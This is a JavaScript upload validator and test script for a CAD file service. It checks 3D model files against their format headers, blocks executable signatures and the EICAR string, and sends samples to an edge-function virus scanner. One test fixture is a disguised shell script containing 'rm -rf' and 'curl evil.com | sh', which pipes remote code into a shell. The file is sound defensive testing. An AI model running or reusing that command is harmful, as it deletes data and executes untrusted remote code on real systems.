// Common malicious executable magic numbers / script headers
const MALICIOUS_HEADERS = [
  { name: "Windows PE/DOS Executable (MZ)", bytes: Buffer.from([0x4d, 0x5a]) },
  { name: "Linux ELF Executable", bytes: Buffer.from([0x7f, 0x45, 0x4c, 0x46]) },
  { name: "macOS Mach-O 32-bit", bytes: Buffer.from([0xfe, 0xed, 0xfa, 0xce]) },
  { name: "macOS Mach-O 64-bit", bytes: Buffer.from([0xfe, 0xed, 0xfa, 0xcf]) },
  { name: "macOS Mach-O (Reversed)", bytes: Buffer.from([0xce, 0xfa, 0xed, 0xfe]) },
  { name: "Java Class / Mach-O Fat Binary", bytes: Buffer.from([0xca, 0xfe, 0xba, 0xbe]) },
  { name: "Shell Script Shebang", bytes: Buffer.from([0x23, 0x21]) },
];

const EICAR_SIGNATURE = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

function verifyModelFormatMagic(ext, buf) {
  const cleanExt = ext.replace(".", "").toLowerCase();

  for (const sig of MALICIOUS_HEADERS) {
    if (buf.length >= sig.bytes.length && buf.subarray(0, sig.bytes.length).equals(sig.bytes)) {
      return {
        valid: false,
        reason: `Executable binary signature detected (${sig.name}). Disallowed file masquerading as .${cleanExt} rejected before storage.`,
      };
    }
  }

  if (buf.includes(Buffer.from(EICAR_SIGNATURE))) {
    return {
      valid: false,
      reason: "Malware / virus signature detected in uploaded file (EICAR-Test-Signature). Upload rejected before storage.",
    };
  }

  if (cleanExt === "3mf") {
    if (buf.length < 4 || buf[0] !== 0x50 || buf[1] !== 0x4b) {
      return { valid: false, reason: "Invalid 3MF package: Missing standard ZIP (PK) container header." };
    }
    return { valid: true };
  }

  if (cleanExt === "step" || cleanExt === "stp") {
    const textPreview = buf.subarray(0, 512).toString("utf8");
    if (!textPreview.includes("ISO-10303-21") && !textPreview.includes("HEADER;")) {
      return { valid: false, reason: "Invalid STEP file: Missing 'ISO-10303-21' or 'HEADER;' Exchange Structure definition." };
    }
    return { valid: true };
  }

  if (cleanExt === "stl") {
    const textHead = buf.subarray(0, 80).toString("utf8").trim().toLowerCase();
    if (textHead.startsWith("solid")) {
      const sample = buf.subarray(0, Math.min(buf.length, 512));
      const hasNullBytes = sample.some((b) => b === 0);
      if (!hasNullBytes) {
        return { valid: true };
      }
    }

    if (buf.length >= 84) {
      const triangleCount = buf.readUInt32LE(80);
      const expectedSize = 84 + triangleCount * 50;
      if (triangleCount > 0 && Math.abs(buf.length - expectedSize) <= 100) {
        return { valid: true };
      }
    }

    if (textHead.startsWith("solid")) {
      return { valid: true };
    }

    return {
      valid: false,
      reason: "Invalid STL file: Header and triangle geometry do not match valid ASCII or Binary STL specifications.",
    };
  }

  if (cleanExt === "obj") {
    const textSample = buf.subarray(0, 1024).toString("utf8");
    const lines = textSample.split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
    const hasObjTokens = lines.some((l) => l.startsWith("v ") || l.startsWith("f ") || l.startsWith("vt ") || l.startsWith("vn "));
    if (!hasObjTokens && lines.length > 0) {
      return { valid: false, reason: "Invalid Wavefront OBJ file: Missing geometric vertex (v) or face (f) elements." };
    }
    return { valid: true };
  }

  return { valid: true };
}
import fs from "fs";
import path from "path";

// Load environment variables from .env.local
const envPath = path.resolve(process.cwd(), ".env.local");
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, "utf8");
  for (const line of envContent.split("\n")) {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith("#")) {
      const idx = trimmed.indexOf("=");
      if (idx !== -1) {
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (!process.env[key]) {
          process.env[key] = val;
        }
      }
    }
  }
}

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || "https://vjlsuadvxjmxrwnqytmu.supabase.co";
const SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

async function testEdgeScanner(filename, buffer) {
  const res = await fetch(`${SUPABASE_URL}/functions/v1/model-virus-scanner`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${SERVICE_KEY}`,
    },
    body: JSON.stringify({
      filename,
      fileBase64: buffer.toString("base64"),
    }),
  });
  return await res.json();
}

async function run() {
  console.log("=== PHASE 3 ADVANCED MAGIC-BYTE & EDGE VIRUS SCANNER TEST ===\n");

  // TEST 1: Windows PE Executable disguised as .stl (e.g. payload.exe renamed to payload.stl)
  const peExecutable = Buffer.concat([
    Buffer.from([0x4d, 0x5a]), // MZ header
    Buffer.from("This program cannot be run in DOS mode.\r\r\n$PE\0\0"),
    Buffer.alloc(200, 0),
  ]);
  const check1 = verifyModelFormatMagic(".stl", peExecutable);
  console.log("[TEST 1: Disguised Windows PE Executable -> payload.stl]");
  console.log("Local Magic-Byte Result:", check1);
  const edge1 = await testEdgeScanner("payload.stl", peExecutable);
  console.log("Edge Function Scanner Result:", edge1);
  if (check1.valid || edge1.safe) throw new Error("Test 1 Failed: Disguised PE executable was not blocked!");

  // TEST 2: Linux ELF Binary disguised as .3mf (payload.elf renamed to model.3mf)
  const elfBinary = Buffer.concat([
    Buffer.from([0x7f, 0x45, 0x4c, 0x46]), // ELF header
    Buffer.alloc(100, 0x90),
  ]);
  const check2 = verifyModelFormatMagic(".3mf", elfBinary);
  console.log("\n[TEST 2: Disguised Linux ELF Binary -> model.3mf]");
  console.log("Local Magic-Byte Result:", check2);
  const edge2 = await testEdgeScanner("model.3mf", elfBinary);
  console.log("Edge Function Scanner Result:", edge2);
  if (check2.valid || edge2.safe) throw new Error("Test 2 Failed: Disguised ELF binary was not blocked!");

  // TEST 3: Shell Script disguised as .step (exploit.sh renamed to bracket.step)
  const shellScript = Buffer.from("#!/bin/bash\nrm -rf /tmp/data\ncurl evil.com | sh\n");
  const check3 = verifyModelFormatMagic(".step", shellScript);
  console.log("\n[TEST 3: Disguised Shell Script -> bracket.step]");
  console.log("Local Magic-Byte Result:", check3);
  const edge3 = await testEdgeScanner("bracket.step", shellScript);
  console.log("Edge Function Scanner Result:", edge3);
  if (check3.valid || edge3.safe) throw new Error("Test 3 Failed: Disguised shell script was not blocked!");

  // TEST 4: Corrupted / Random Binary disguised as .stl (fails 84 + 50*N math)
  const corruptedBinary = Buffer.concat([
    Buffer.alloc(80, 0x41), // Dummy 80 byte header
    Buffer.from([0x05, 0x00, 0x00, 0x00]), // claims 5 triangles = needs 84 + 250 = 334 bytes
    Buffer.alloc(20, 0x22), // Only 104 bytes total!
  ]);
  const check4 = verifyModelFormatMagic(".stl", corruptedBinary);
  console.log("\n[TEST 4: Corrupted / Malformed Binary Mesh -> corrupted.stl]");
  console.log("Local Magic-Byte Result:", check4);
  if (check4.valid) throw new Error("Test 4 Failed: Corrupted binary mesh was not blocked!");

  // TEST 5: Legitimate ASCII STL model
  const legitimateAsciiStl = Buffer.from(
    "solid legitimate_cube\n" +
    "facet normal 0 0 0\n" +
    "  outer loop\n" +
    "    vertex 0 0 0\n" +
    "    vertex 1 0 0\n" +
    "    vertex 1 1 0\n" +
    "  endloop\n" +
    "endfacet\n" +
    "endsolid legitimate_cube\n"
  );
  const check5 = verifyModelFormatMagic(".stl", legitimateAsciiStl);
  console.log("\n[TEST 5: Legitimate ASCII STL -> legitimate_cube.stl]");
  console.log("Local Magic-Byte Result:", check5);
  const edge5 = await testEdgeScanner("legitimate_cube.stl", legitimateAsciiStl);
  console.log("Edge Function Scanner Result:", edge5);
  if (!check5.valid || !edge5.safe) throw new Error("Test 5 Failed: Valid ASCII STL was blocked!");

  // TEST 6: Legitimate Binary STL model (1 triangle = 84 + 50 = 134 bytes)
  const header = Buffer.alloc(80, 0x20);
  const triangleCountBuf = Buffer.alloc(4);
  triangleCountBuf.writeUInt32LE(1, 0); // 1 triangle
  const triangleData = Buffer.alloc(50, 0x00);
  const legitimateBinaryStl = Buffer.concat([header, triangleCountBuf, triangleData]);
  const check6 = verifyModelFormatMagic(".stl", legitimateBinaryStl);
  console.log("\n[TEST 6: Legitimate Binary STL (134 bytes, 1 triangle) -> legitimate_binary.stl]");
  console.log("Local Magic-Byte Result:", check6);
  const edge6 = await testEdgeScanner("legitimate_binary.stl", legitimateBinaryStl);
  console.log("Edge Function Scanner Result:", edge6);
  if (!check6.valid || !edge6.safe) throw new Error("Test 6 Failed: Valid Binary STL was blocked!");

  // TEST 7: Legitimate STEP ISO-10303-21 CAD file
  const legitimateStep = Buffer.from(
    "ISO-10303-21;\nHEADER;\nFILE_DESCRIPTION(('DripLnk CAD'),'2;1');\nFILE_NAME('aerospace_bracket.stp','2026-09-12',('Engineer'),('DripLnk'),'','','');\nENDSEC;\nDATA;\n#1=MANIFOLD_SOLID_BREP('BRACKET',#2);\nENDSEC;\nEND-ISO-10303-21;\n"
  );
  const check7 = verifyModelFormatMagic(".step", legitimateStep);
  console.log("\n[TEST 7: Legitimate STEP CAD File -> aerospace_bracket.stp]");
  console.log("Local Magic-Byte Result:", check7);
  const edge7 = await testEdgeScanner("aerospace_bracket.stp", legitimateStep);
  console.log("Edge Function Scanner Result:", edge7);
  if (!check7.valid || !edge7.safe) throw new Error("Test 7 Failed: Valid STEP file was blocked!");

  console.log("\n=== ALL 7 ADVANCED MAGIC-BYTE & EDGE VIRUS SCANNER TESTS PASSED ===");
}

run().catch((err) => {
  console.error("Test execution error:", err);
  process.exit(1);
});
